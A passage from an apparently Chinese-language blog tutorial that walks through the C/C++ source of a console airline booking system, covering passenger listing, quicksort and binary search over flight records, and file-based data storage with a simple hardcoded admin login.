<p><img src="./11.png" alt="图2-11"></p>
<h5 id="航班乘客信息"><a href="#航班乘客信息" class="headerlink" title="航班乘客信息"></a>航班乘客信息</h5><p>查看所有航班的乘客信息.</p>
<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">passager</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在查看乘客信息   ‖---\n\n"</span>); </span><br><span class="line">    <span class="keyword">if</span>(use==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   没有乘客可查看\n"</span>);</span><br><span class="line">        admire();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t     乘客订单      姓名      身份证号      票数      航班号\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;use;i++)&#123;<span class="comment">// 依次输出乘客信息 </span></span><br><span class="line">        <span class="keyword">if</span>(user[i].ticket!=<span class="number">0</span>)&#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%42d %11s %11s %11d %10d\n"</span>,user[i].bill,user[i].name,user[i].card,user[i].ticket,user[i].airID);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   按任意键返回上一层!\n\n"</span>);</span><br><span class="line">    	getch();</span><br><span class="line">        admire();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序运行图:</p>
<p><img src="./12.png" alt="图2-12"></p>
<h5 id="航班列表"><a href="#航班列表" class="headerlink" title="航班列表"></a>航班列表</h5><p>查看所有航班信息.同使用乘客界面的浏览航班<code>List()</code>子函数.</p>
<h5 id="整理航班列表"><a href="#整理航班列表" class="headerlink" title="整理航班列表"></a>整理航班列表</h5><p>会对航班数据进行一次排序.</p>
<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quicksort</span><span class="params">(<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    plane t,temp;</span><br><span class="line">    <span class="keyword">if</span>(left&gt;right) </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    temp=data[left]; <span class="comment">//temp中存的就是基准数</span></span><br><span class="line">    i=left;</span><br><span class="line">    j=right;</span><br><span class="line">    <span class="keyword">while</span>(i!=j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//顺序很重要，要先从右边开始找</span></span><br><span class="line">        <span class="keyword">while</span>(data[j].ID&gt;=temp.ID &amp;&amp; i&lt;j)</span><br><span class="line">            j--;</span><br><span class="line">        <span class="comment">//再找右边的</span></span><br><span class="line">        <span class="keyword">while</span>(data[i].ID&lt;=temp.ID &amp;&amp; i&lt;j)</span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j)</span><br><span class="line">        &#123;</span><br><span class="line">            t=data[i];</span><br><span class="line">            data[i]=data[j];</span><br><span class="line">            data[j]=t;</span><br><span class="line">            writeData();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    data[left]=data[i];</span><br><span class="line">    data[i]=temp;</span><br><span class="line">    writeData();</span><br><span class="line">    quicksort(left,i<span class="number">-1</span>);</span><br><span class="line">    quicksort(i+<span class="number">1</span>,right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">order</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    c=count;</span><br><span class="line">    quicksort(<span class="number">0</span>,c<span class="number">-1</span>);</span><br><span class="line">    List();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="排序算法-二分查找"><a href="#排序算法-二分查找" class="headerlink" title="排序算法(二分查找)"></a>排序算法(二分查找)</h4><p>浏览信息时进行排序.算法实现:假设表中元素是按升序排列，将表中间位置的关键字与查找关键字比较，如果两者相等，则查找成功；否则利用中间位置的关键字将表分成前、后两个表，如果中间位置的关键字大于查找关键字，则进一步查找前面的表，否则进一步查找后面的表。一直重复以上过程，直到找到满足条件的关键字，查找成功，或表里没有关键字，查找失败。</p>
<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_research</span><span class="params">(<span class="keyword">int</span> left,<span class="keyword">int</span> right,<span class="keyword">int</span> element)</span><span class="comment">//这里定义了二分查找,通过左半边、右半边、中间值三个值进行比较,对数据进行排序 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(left&lt;=right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>;<span class="comment">//定义中间值</span></span><br><span class="line">        <span class="keyword">if</span>(data[mid].ID&gt;element)</span><br><span class="line">        &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(data[mid].ID&lt;element)</span><br><span class="line">        &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="完整源代码"><a href="#完整源代码" class="headerlink" title="完整源代码"></a>完整源代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 10000;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;<span class="comment">//加入这句话可以使用&lt;&lt;进行输入输出</span></span><br><span class="line">FILE *fp;<span class="comment">//定义一个文件读取的空指针</span></span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> use=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> inf=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">plane</span>//定义一个航班的结构体及变量 </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> ID;<span class="comment">//航班ID</span></span><br><span class="line">    <span class="keyword">char</span> time[<span class="number">20</span>];<span class="comment">//起降时间</span></span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">10</span>];<span class="comment">//日期</span></span><br><span class="line">    <span class="keyword">char</span> start[<span class="number">10</span>];<span class="comment">//起点</span></span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">end</span>[<span class="number">10</span>];<span class="comment">//终点</span></span><br><span class="line">    <span class="keyword">int</span> P_num;<span class="comment">//票数 </span></span><br><span class="line">    <span class="keyword">int</span> price;<span class="comment">//票价</span></span><br><span class="line">&#125;data[<span class="number">100</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">people</span>&#123;</span><span class="comment">//定义一个乘客的结构体及变量 </span></span><br><span class="line">    <span class="keyword">int</span> bill;<span class="comment">//买票钱 </span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">10</span>];<span class="comment">//姓名 </span></span><br><span class="line">    <span class="keyword">char</span> card[<span class="number">10</span>];<span class="comment">//证件号 </span></span><br><span class="line">    <span class="keyword">int</span> ticket;<span class="comment">//机票数 </span></span><br><span class="line">    <span class="keyword">int</span> airID;<span class="comment">//航班号 </span></span><br><span class="line">&#125;user[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Login</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Search</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Book</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Back</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bill</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">drop</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main_menu</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deal</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">admire</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">List</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fix</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">order</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Search_end</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Search_id</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readData</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">passager</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">userData</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">userWrite</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quicksort</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"color F1"</span>);<span class="comment">//修改界面颜色,第一位前景色,第二位背景色 </span></span><br><span class="line">    readData();<span class="comment">//文件读取(乘客)</span></span><br><span class="line">    userData();<span class="comment">//文件读取(管理员)</span></span><br><span class="line">    main_menu();<span class="comment">//开始界面</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readData</span><span class="params">()</span><span class="comment">//读取文件</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>((fp=fopen(<span class="string">"./plane.txt"</span>,<span class="string">"r+"</span>))==<span class="literal">NULL</span>)  <span class="comment">//r+具有读写属性,从文件头开始写,保留原文件中没有被覆盖的内容, 判断文件打开错误 </span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">fscanf</span>(fp,<span class="string">"%24d %11s %11s %12s %12s %10d %10d\n"</span>,&amp;data[i].ID,data[i].time,data[i].data,data[i].start,data[i].<span class="built_in">end</span>,&amp;data[i].P_num,&amp;data[i].price))</span><br><span class="line">    &#123;</span><br><span class="line">        i++;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeData</span><span class="params">()</span><span class="comment">//写入文件</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>((fp=fopen(<span class="string">"./plane.txt"</span>,<span class="string">"w"</span>))==<span class="literal">NULL</span>)<span class="comment">//w 打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(fp,<span class="string">"%24d %11s %11s %12s %12s %10d %10d\n"</span>,data[i].ID,data[i].time,data[i].data,data[i].start,data[i].<span class="built_in">end</span>,data[i].P_num,data[i].price);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> account;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deal</span><span class="params">()</span><span class="comment">//管理员账号设定(即输入正确密码进入管理系统) </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,t=<span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入账号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;account);</span><br><span class="line">    <span class="keyword">if</span> (account==<span class="number">200214</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    admire();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">userData</span><span class="params">()</span><span class="comment">//读取文件</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>((fp=fopen(<span class="string">"./user.txt"</span>,<span class="string">"r+"</span>))==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">fscanf</span>(fp,<span class="string">"%42d %11s %11s %11d %10d\n"</span>,&amp;user[i].bill,user[i].name,user[i].card,&amp;user[i].ticket,&amp;user[i].airID))</span><br><span class="line">    &#123;</span><br><span class="line">        i++;</span><br><span class="line">        use++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">userWrite</span><span class="params">()</span><span 